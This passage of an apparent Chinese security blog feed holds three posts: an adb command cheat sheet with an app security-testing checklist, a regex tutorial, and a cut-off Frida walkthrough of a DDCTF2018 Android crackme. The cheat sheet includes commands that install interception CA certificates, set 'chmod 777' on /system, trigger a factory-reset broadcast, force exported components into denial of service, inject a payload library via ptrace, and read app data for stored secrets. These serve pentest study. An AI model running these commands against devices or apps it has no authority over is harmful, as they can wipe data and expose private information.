class="line">d.放入&#x2F;system&#x2F;ca-certificates&#x2F;files&#x2F;</span><br><span class="line">实际测试，可能会报错，报错后不管格式，DER 换成PEM 试试</span><br><span class="line">编译到：&#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;</span><br><span class="line">e:烧录重启验证</span><br></pre></td></tr></table></figure><p><a href="http://wiki.cacert.org/FAQ/ImportRootCert#CAcert_user_trusted_certificates">http://wiki.cacert.org/FAQ/ImportRootCert#CAcert_user_trusted_certificates</a></p><p>Fiddler默认是cer证书，如何转为pem呢？指令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform der -in abc.cer -out out.pem</span><br></pre></td></tr></table></figure><p><a href="https://segmentfault.com/a/1190000017035564">https://segmentfault.com/a/1190000017035564</a><br>解决只读文件无法写入的问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb remount</span><br><span class="line">adb shell</span><br><span class="line">chmod 777 system</span><br></pre></td></tr></table></figure><h3 id="第三方apk"><a href="#第三方apk" class="headerlink" title="第三方apk"></a>第三方apk</h3><p>AndroidProxySetter工具可以帮助我们使用adb命令可以快速进行wifi代理的设置和清除<br>GitHub地址：<a href="https://github.com/jpkrause/AndroidProxySetter">https://github.com/jpkrause/AndroidProxySetter</a></p><p>下好apk后，安装到手机</p><pre><code>adb install proxy-setter-debug-0.2.1.apk</code></pre><p>设置代理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -n tk.elevenk.proxysetter&#x2F;.MainActivity -e host 代理IP地址 -e port 端口号 -e ssid WIFI名称 -e reset-wifi true -e key WIFI密码</span><br></pre></td></tr></table></figure><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -n tk.elevenk.proxysetter&#x2F;.MainActivity -e host 127.0.0.1 -e port 8888 -e ssid YOUR-WIFI-NAME -e reset-wifi true -e key YOUR-WIFI-PASSWORD</span><br></pre></td></tr></table></figure><h3 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h3><pre><code>// 列出进程列表 ，其中包含进程的 pid 等信息adb shell ps// 杀死指定pid的进程adb shell kill pid// 查看指定进程信息adb shell ps -x pid </code></pre><h2 id="apk管理"><a href="#apk管理" class="headerlink" title="apk管理"></a>apk管理</h2><h3 id="adb导出（手机apk到电脑）"><a href="#adb导出（手机apk到电脑）" class="headerlink" title="adb导出（手机apk到电脑）"></a>adb导出（手机apk到电脑）</h3><pre><code>1、adb shell pm list package打印出来所有安装到手机上的APP包名adb shell pm list package com.huawei.   //查找包含com.huawei的包2、adb shell pm path com.xxx.xxx找出安装后的包名应用的apk所在位置3、adb pull path_apk  out_apkpath_apk为apk在手机上的目录，即2中的apk在手机中的目录，out_apk为导出apk的目标路径。4、通过adb命令查看Android手机已安装应用的版本号versionCode和versionNameadb shell dumpsys package  [PackageName] | findstr versionCodeadb shell dumpsys package  [PackageName] | findstr versionName</code></pre><h2 id="日志输出"><a href="#日志输出" class="headerlink" title="日志输出"></a>日志输出</h2><pre><code>// 查看指定 tag 日志adb logcat -s tag// 清除log缓存adb logcat -c</code></pre><h2 id="启动activity"><a href="#启动activity" class="headerlink" title="启动activity"></a>启动activity</h2><pre><code>// 启动应用// -n 指定包名/包名+启动类的类名 ，启动类的类名必须是完整路径adb shell am start -n package/package-activity// 停止应用adb shell am force-stop package// 启动 serviceadb shell am startservice [options] &lt;INTENT&gt;举例：adb shell am startservice -a com.lt.test.action.ONESERVICE举例：adb shell am startservice -n com.lt.test/.MyService// 发送广播adb shell am broadcast [options] &lt;INTENT&gt;// 发送一个广播去关闭一个activityadb shell am broadcast -a &quot;action_finish&quot; // 恢复出厂设置的方法，会清除内存所有内容adb shell am broadcast -a android.intent.action.MASTER_CLEARadb shell am broadcast -n com.lt.test/.MyBroadcast// 列举出所有包含&lt;INTENT&gt;的packageadb shell pm list packages [options] &lt;INTENT&gt;adb shell pm list packages com.lt</code></pre><h2 id="管理安装包"><a href="#管理安装包" class="headerlink" title="管理安装包"></a>管理安装包</h2><pre><code>adb shell pm安装应用程序adb install xxx.apk// 覆盖安装(保留缓存和数据)adb install -r xxx.apk// 安装apk到sd卡adb install -s xxx.apk卸载应用程序adb uninstall package// 卸载时保留数据和缓存目录adb uninstall -k package</code></pre><p>​    </p><pre><code>列出设备上的所有权限adb shell pm list permissions列出设备上安装的所有app的包名adb shell pm list packages// 列出指定包名对应的apk路径adb shell pm path com.android.search// 清空指定包名对应的应用的数据和缓存文件，开发时很有用adb shell pm clear com.android.search</code></pre><p>​    </p><pre><code>列出设备上的所有featureadb shell pm list features</code></pre><h2 id="adb安装证书"><a href="#adb安装证书" class="headerlink" title="adb安装证书"></a>adb安装证书</h2><p>adb shell am start -n com.android.certinstaller/.CertInstallerMain -a android.intent.action.VIEW -t application/x-x509-ca-cert file:///sdcard/cacert.cer</p><p>参考：<a href="https://www.jianshu.com/p/f547b05a5335">https://www.jianshu.com/p/f547b05a5335</a></p><h2 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h2><pre><code>// 获取系统属性，可以获取到一大堆关于系统信息（键值对形式）adb shell getprop // 获取系统属性并过滤出包含version的信息adb shell getprop | grep version</code></pre><p>​    </p><pre><code>查看 cpu 和 内存使用情况// 每隔一秒会刷新一次 cpu 和 内存情况adb shell top// 查看占用内存前3的应用adb shell top -m 3// 刷新3次内存信息（不指定-n参数的话默认每秒会刷新1次数据）：adb shell top -n 3// 查看占用内存前3的应用，刷新1次adb shell top -m 3 -n 1</code></pre><p>​    </p><pre><code>查看系统当前 cpu 使用情况adb shell cat /proc/cpuinfoadb shell cat /proc/stat查看系统当前内存使用情况adb shell cat /proc/meminfo查看指定包名应用内存使用情况，各项信息具体说明adb shell dumpsys meminfo package</code></pre><p>​    </p><pre><code>查看 serviceadb shell service listadb shell cat /system/build.prop电池相关// 查看电量管理信息，其中可以知道当前那个应用持有WAKE_LOCK锁adb shell dumpsys power// 查看电池用量情况adb shell dumpsys battery// 查看电池使用日志adb shell dumpsys batterystats图形界面日志分析参考google提供的工具 https://github.com/google/battery-historian</code></pre><h2 id="查看当前activity"><a href="#查看当前activity" class="headerlink" title="查看当前activity"></a>查看当前activity</h2><pre><code>logcat | grep ActivityManageradb shell dumpsys activity activitiesadb shell dumpsys activity activities | findstr &quot;应用包名&quot; 过滤字符串忽略大小写 : adb logcat | grep -i wifi ;过滤固定字符串 : 只要命令行出现的日志都可以过滤, 不管是不是标签;-- 命令 : adb logcat | grep Wifi ;</code></pre><h1 id="APP安全测试"><a href="#APP安全测试" class="headerlink" title="APP安全测试"></a>APP安全测试</h1><h2 id="组件安全"><a href="#组件安全" class="headerlink" title="组件安全"></a>组件安全</h2><h3 id="activity-是否可以被ddos"><a href="#activity-是否可以被ddos" class="headerlink" title="activity 是否可以被ddos"></a>activity 是否可以被ddos</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -S -n 包名&#x2F;Activity名</span><br></pre></td></tr></table></figure><h3 id="BroadcastReceiver拒绝服务"><a href="#BroadcastReceiver拒绝服务" class="headerlink" title="BroadcastReceiver拒绝服务"></a>BroadcastReceiver拒绝服务</h3><p>查看AndroidManifest.xml是否存在Receiver导出<br>利用adb命令启动被导出的Receiver</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast –n pachage_name&#x2F;receiver_name</span><br></pre></td></tr></table></figure><h3 id="service拒绝服务"><a href="#service拒绝服务" class="headerlink" title="service拒绝服务"></a>service拒绝服务</h3><p>查看AndroidManifest.xml是否存在Service导出<br>利用adb命令启动被导出的Service</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start service –n pachage_name&#x2F;service_name</span><br></pre></td></tr></table></figure><h3 id="Provider目录遍历"><a href="#Provider目录遍历" class="headerlink" title="Provider目录遍历"></a>Provider目录遍历</h3><p>查看Provider是否导出<br>查看反编译代码,检查OpenFile函数中是否包含路径校验逻辑</p><h3 id="Ptrace注入"><a href="#Ptrace注入" class="headerlink" title="Ptrace注入"></a>Ptrace注入</h3><h4 id="检测方法一："><a href="#检测方法一：" class="headerlink" title="检测方法一："></a>检测方法一：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">推送inject和libpayload.so到手机&#x2F;data&#x2F;local&#x2F;tmp中</span><br><span class="line">为inject添加执行权限</span><br><span class="line">执行注入命令inject 进程名 &#x2F;data&#x2F;local&#x2F;tmp&#x2F;libpayload.so 任意字符串</span><br><span class="line">adb logcat -s 360Inject抓取日志分析是否注入成功</span><br></pre></td></tr></table></figure><h4 id="检测方法二："><a href="#检测方法二：" class="headerlink" title="检测方法二："></a>检测方法二：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -U -i &quot;recv*&quot;  -f 包名</span><br><span class="line">cat &#x2F;proc&#x2F;PID&#x2F;maps |grep frida</span><br></pre></td></tr></table></figure><h3 id="SharedPreferences明文保存敏感信息"><a href="#SharedPreferences明文保存敏感信息" class="headerlink" title="SharedPreferences明文保存敏感信息"></a>SharedPreferences明文保存敏感信息</h3><p>跳转到app的数据目录</p><p>查看所有xml文件,检测是否包含敏感数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">cd &#x2F;data&#x2F;data&#x2F;package_name&#x2F;hared_prefs&#x2F;</span><br></pre></td></tr></table></figure><p>查看所有xml文件,检测是否包含敏感数据</p><h3 id="SQLite明文保存敏感信息"><a href="#SQLite明文保存敏感信息" class="headerlink" title="SQLite明文保存敏感信息"></a>SQLite明文保存敏感信息</h3><p>跳转到app的database目录</p><p>查看所有db文件,检测是否包含敏感数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">cd &#x2F;data&#x2F;data&#x2F;package_name&#x2F;database&#x2F;</span><br></pre></td></tr></table></figure><p>查看所有db文件,检测是否包含敏感数据</p><h3 id="log敏感信息检测"><a href="#log敏感信息检测" class="headerlink" title="log敏感信息检测"></a>log敏感信息检测</h3><p>使用logcat命令抓取log</p><p>分析日志中是否包含敏感信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell adb logcat &gt; logfile.log</span><br></pre></td></tr></table></figure><p>分析日志中是否包含敏感信息</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;adb使用&quot;&gt;&lt;a href=&quot;#adb使用&quot; class=&quot;headerlink&quot; title=&quot;adb使用&quot;&gt;&lt;/a&gt;adb使用&lt;/h1&gt;&lt;h2 id=&quot;adb连接&quot;&gt;&lt;a href=&quot;#adb连接&quot; class=&quot;headerlink&quot; title=&quot;adb
      
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="adb" scheme="http://www.ol4three.com/tags/adb/"/>
    
  </entry>
  
  <entry>
    <title>正则小技巧和数据过滤处理</title>
    <link href="http://www.ol4three.com/2021/01/05/WEB/%E6%AD%A3%E5%88%99%E5%B0%8F%E6%8A%80%E5%B7%A7%E5%92%8C%E6%95%B0%E6%8D%AE%E8%BF%87%E6%BB%A4%E5%A4%84%E7%90%86/"/>
    <id>http://www.ol4three.com/2021/01/05/WEB/%E6%AD%A3%E5%88%99%E5%B0%8F%E6%8A%80%E5%B7%A7%E5%92%8C%E6%95%B0%E6%8D%AE%E8%BF%87%E6%BB%A4%E5%A4%84%E7%90%86/</id>
    <published>2021-01-05T12:41:39.000Z</published>
    <updated>2021-01-05T13:34:22.706Z</updated>
    
    <content type="html"><![CDATA[<h1 id="正则基础"><a href="#正则基础" class="headerlink" title="正则基础"></a>正则基础</h1><blockquote><p>首先讲一下正则的规则只需要管What How即可 其他无需考虑</p></blockquote><h2 id="匹配字符-What"><a href="#匹配字符-What" class="headerlink" title="匹配字符(What)"></a>匹配字符(What)</h2><ul><li><code>.</code></li><li><code>[abcd]</code> <code>[a-zA-Z]</code> <code>[^abcd]</code></li><li><code>\d</code> <code>\s</code> <code>\t</code> <code>\w</code> …</li></ul><h2 id="匹配数量-How"><a href="#匹配数量-How" class="headerlink" title="匹配数量(How)"></a>匹配数量(How)</h2><ul><li><code>*</code></li><li><code>+</code></li><li><code>?</code></li><li><code>&#123;n&#125;</code></li><li><code>&#123;n,&#125;</code></li><li><code>&#123;n,m&#125;</code></li></ul><h2 id="子匹配"><a href="#子匹配" class="headerlink" title="子匹配"></a>子匹配</h2><ul><li><code>()</code></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li><code>a*</code> Greedy 贪婪</li><li><code>a*?</code> Lazy</li><li><code>|</code> 或</li><li><code>^</code> <code>$</code></li></ul><h1 id="用法1"><a href="#用法1" class="headerlink" title="用法1"></a>用法1</h1><p>使用数据如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">2wangwei200falsefalse791true</span><br><span class="line">8wangjing200falsefalse791true</span><br><span class="line">72lihong200falsefalse791true</span><br><span class="line">94wangxin200falsefalse791true</span><br><span class="line">107liujuan200falsefalse791true</span><br><span class="line">119zhangbo200falsefalse791true</span><br><span class="line">145zhanghao200falsefalse791true</span><br><span class="line">169zhangbin200falsefalse791true</span><br><span class="line">185wangjing200falsefalse791true</span><br><span class="line">224liuxin200falsefalse791true</span><br><span class="line">260yanglin200falsefalse790true</span><br><span class="line">354likai200falsefalse791true</span><br><span class="line">390lixiang200falsefalse791true</span><br><span class="line">435zhangbo200falsefalse791true</span><br><span class="line">436wangxin200falsefalse791true</span><br></pre></td></tr></table></figure><p>推荐一个网站</p><p><a href="https://regex101.com/">https://regex101.com/</a></p><p>打开进行正则匹配</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105210427307.png" alt="image-20210105210427307" style="zoom:50%;"><p>直接生成Python脚本</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105210557490.png" alt="image-20210105210557490"></p><p>复制对应代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># coding&#x3D;utf8</span><br><span class="line"># the above tag defines encoding for this document and is for Python 2.x compatibility</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">regex &#x3D; r&quot;(\d+\s+)(\w+)(\s\d+\s\w+\s\w+\s\d+\s\w+)&quot;</span><br><span class="line"></span><br><span class="line">test_str &#x3D; (&quot;2  wangwei 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;8  wangjing    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;72 lihong  200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;94 wangxin 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;107    liujuan 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;119    zhangbo 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;145    zhanghao    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;169    zhangbin    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;185    wangjing    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;224    liuxin  200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;260    yanglin 200 false   false   790 true    \n&quot;</span><br><span class="line">    &quot;354    likai   200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;390    lixiang 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;435    zhangbo 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;436    wangxin 200 false   false   791 true    &quot;)</span><br><span class="line"></span><br><span class="line">matches &#x3D; re.finditer(regex, test_str, re.MULTILINE)</span><br><span class="line"></span><br><span class="line">for matchNum, match in enumerate(matches, start&#x3D;1):</span><br><span class="line">    </span><br><span class="line">    print (&quot;Match &#123;matchNum&#125; was found at &#123;start&#125;-&#123;end&#125;: &#123;match&#125;&quot;.format(matchNum &#x3D; matchNum, start &#x3D; match.start(), end &#x3D; match.end(), match &#x3D; match.group()))</span><br><span class="line">    </span><br><span class="line">    for groupNum in range(0, len(match.groups())):</span><br><span class="line">        groupNum &#x3D; groupNum + 1</span><br><span class="line">        </span><br><span class="line">        print (&quot;Group &#123;groupNum&#125; found at &#123;start&#125;-&#123;end&#125;: &#123;group&#125;&quot;.format(groupNum &#x3D; groupNum, start &#x3D; match.start(groupNum), end &#x3D; match.end(groupNum), group &#x3D; match.group(groupNum)))</span><br><span class="line"></span><br><span class="line"># Note: for Python 2.7 compatibility, use ur&quot;&quot; to prefix the regex and u&quot;&quot; to prefix the test string and substitution.</span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># coding&#x3D;utf8</span><br><span class="line"># the above tag defines encoding for this document and is for Python 2.x compatibility</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">regex &#x3D; r&quot;(\d+\s+)(\w+)(\s\d+\s\w+\s\w+\s\d+\s\w+)&quot;</span><br><span class="line"></span><br><span class="line">test_str &#x3D; (&quot;2  wangwei 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;8  wangjing    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;72 lihong  200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;94 wangxin 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;107    liujuan 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;119    zhangbo 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;145    zhanghao    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;169    zhangbin    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;185    wangjing    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;224    liuxin  200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;260    yanglin 200 false   false   790 true    \n&quot;</span><br><span class="line">    &quot;354    likai   200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;390    lixiang 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;435    zhangbo 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;436    wangxin 200 false   false   791 true    &quot;)</span><br><span class="line"></span><br><span class="line">matches &#x3D; re.finditer(regex, test_str, re.MULTILINE)</span><br><span class="line"></span><br><span class="line">for i in matches:</span><br><span class="line">    print(i.group(2))</span><br></pre></td></tr></table></figure><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105210650979.png" alt="image-20210105210650979" style="zoom:50%;"><h1 id="用法2"><a href="#用法2" class="headerlink" title="用法2"></a>用法2</h1><p>使用vim进行正则匹配</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:s&#x2F;abc&#x2F;def&#x2F;g 用def替换abc，g为global全局的意思</span><br><span class="line">%s&#x2F;200.*&#x2F;&#x2F;g</span><br></pre></td></tr></table></figure><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105210939127.png" alt="image-20210105210939127" style="zoom:50%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s&#x2F;\(\d\+\s\)&#x2F;&#x2F;g</span><br></pre></td></tr></table></figure><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105210951458.png" alt="image-20210105210951458" style="zoom:50%;"><p>参考链接：</p><p><a href="https://regex101.com/">https://regex101.com/</a></p><p><a href="https://www.runoob.com/python/python-reg-expressions.html">https://www.runoob.com/python/python-reg-expressions.html</a></p><p><a href="https://www.cnblogs.com/penseur/archive/2011/02/25/1964522.html">https://www.cnblogs.com/penseur/archive/2011/02/25/1964522.html</a></p><p><a href="https://gist.github.com/JavaCS3/e36e494e78a02049950bfa7c7ebeb929">https://gist.github.com/JavaCS3/e36e494e78a02049950bfa7c7ebeb929</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;正则基础&quot;&gt;&lt;a href=&quot;#正则基础&quot; class=&quot;headerlink&quot; title=&quot;正则基础&quot;&gt;&lt;/a&gt;正则基础&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;首先讲一下正则的规则只需要管What How即可 其他无需考虑&lt;/p&gt;
&lt;/blockquote&gt;
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="正则" scheme="http://www.ol4three.com/tags/%E6%AD%A3%E5%88%99/"/>
    
  </entry>
  
  <entry>
    <title>Frida--Android逆向之动态加载dex Hook(上)</title>
    <link href="http://www.ol4three.com/2021/01/05/Android/frida/Frida-Android%E9%80%86%E5%90%91%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDdex-Hook-%E4%B8%8A/"/>
    <id>http://www.ol4three.com/2021/01/05/Android/frida/Frida-Android%E9%80%86%E5%90%91%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDdex-Hook-%E4%B8%8A/</id>
    <published>2021-01-05T07:57:36.000Z</published>
    <updated>2021-01-05T13:25:47.039Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Mac Os 10.15.5</span><br><span class="line">Python 3.9</span><br><span class="line">jeb</span><br><span class="line">jadx</span><br><span class="line">frida</span><br><span class="line">apktool</span><br><span class="line">MUMU模拟器</span><br></pre></td></tr></table></figure><blockquote><p>文章使用的是DDCTF2018的android逆向第二题Hello Baby Dex</p></blockquote><p>示例地址：[下载](<a href="https://github.com/ghostmaze/Android-Reverse/blob/master/Hello">https://github.com/ghostmaze/Android-Reverse/blob/master/Hello</a> Baby Dex/app-release.apk)</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Robust热修复框架原理</span><br><span class="line">Java 反射</span><br><span class="line">Robust类 hook</span><br><span class="line">frida基础hook</span><br></pre></td></tr></table></figure><h2 id="APK安装"><a href="#APK安装" class="headerlink" title="APK安装"></a>APK安装</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105160817336.png" alt="image-20210105160817336" style="zoom:50%;"><p>输入字符并验证，错误会Toast出一些信息，可能输入正确的值才能过获取flag直接进入分析</p><h2 id="静态代码分析"><a href="#静态代码分析" class="headerlink" title="静态代码分析"></a>静态代码分析</h2><p>导入jeb中查看AndroidManifest.xml 找到程序的入口MainActivity</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;activity android:name&#x3D;&quot;cn.chaitin.geektan.crackme.MainActivity&quot;&gt;</span><br><span class="line">     &lt;intent-filter&gt;</span><br><span class="line">     &lt;action android:name&#x3D;&quot;android.intent.action.MAIN&quot;&#x2F;&gt;</span><br><span class="line">   &lt;category android:name&#x3D;&quot;android.intent.category.LAUNCHER&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;intent-filter&gt;</span><br><span class="line">&lt;&#x2F;activity&gt;</span><br></pre></td></tr></table></figure><p>在命令行中使用<code>apktool d xx.apk</code>，将APK文件反编译出来</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105162802636.png" alt="image-20210105162802636" style="zoom:50%;"><p>接下来定位到MainActivity的onCreate()方法，可以看到一些可以的变量和方法比如～～上<code>PatchProxy</code>，<code>changeQuickRedirectd</code>等</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105170653328.png" alt="image-20210105170653328"></p><p>同时看到在else中调用了this.runRobust()方法，并且在每个类中都会存在一些changeQuickRedirect变量，以及isSupport()，accessDispatch()方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">private void runRobust() &#123;</span><br><span class="line">    int v4 &#x3D; 4;</span><br><span class="line">    Object[] v0 &#x3D; new Object[0];</span><br><span class="line">    ChangeQuickRedirect v2 &#x3D; MainActivity.changeQuickRedirect;</span><br><span class="line">    Class[] v5 &#x3D; new Class[0];</span><br><span class="line">    Class v6 &#x3D; Void.TYPE;</span><br><span class="line">    MainActivity v1 &#x3D; this;</span><br><span class="line">    boolean v0_1 &#x3D; PatchProxy.isSupport(v0, v1, v2, false, v4, v5, v6);</span><br><span class="line">    if(v0_1) &#123;</span><br><span class="line">        v0 &#x3D; new Object[0];</span><br><span class="line">        v2 &#x3D; MainActivity.changeQuickRedirect;</span><br><span class="line">        v5 &#x3D; new Class[0];</span><br><span class="line">        v6 &#x3D; Void.TYPE;</span><br><span class="line">        v1 &#x3D; this;</span><br><span class="line">        PatchProxy.accessDispatch(v0, v1, v2, false, v4, v5, v6);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        Context v1_1 &#x3D; this.getApplicationContext();</span><br><span class="line">        &#x2F;&#x2F;实例化PatchManipulateImp类</span><br><span class="line">        PatchManipulateImp v2_1 &#x3D; new PatchManipulateImp();</span><br><span class="line">        &#x2F;&#x2F;实例化PatchExecutor类</span><br><span class="line">        PatchExecutor v0_2 &#x3D; new PatchExecutor(v1_1, ((PatchManipulate)v2_1), new GeekTanCallBack());</span><br><span class="line">        v0_2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在runRobust()方法的else中实例化了两个对象跟进第一个PatchMainpulateImp中</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105171302097.png" alt="image-20210105171302097"></p><p>发现在fetchPatchList()方法中 调用了<code>arg17.getAssets().open(**&quot;GeekTan.BMP&quot;**);</code>从资源文件夹中，还在了一个BMP的的图片文件，并将BMP文件内容写入GeekTan.jar中</p><p>具体代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 